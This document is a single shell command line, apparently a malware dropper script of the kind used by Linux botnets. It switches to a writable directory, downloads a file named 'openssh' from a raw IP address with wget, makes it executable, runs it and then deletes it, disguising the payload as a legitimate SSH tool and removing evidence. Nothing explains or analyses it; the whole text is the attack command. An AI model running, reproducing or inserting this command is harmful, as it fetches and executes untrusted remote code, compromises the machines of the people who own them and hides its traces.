cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.167.90.33/openssh; chmod +x openssh; ./openssh; rm -rf openssh
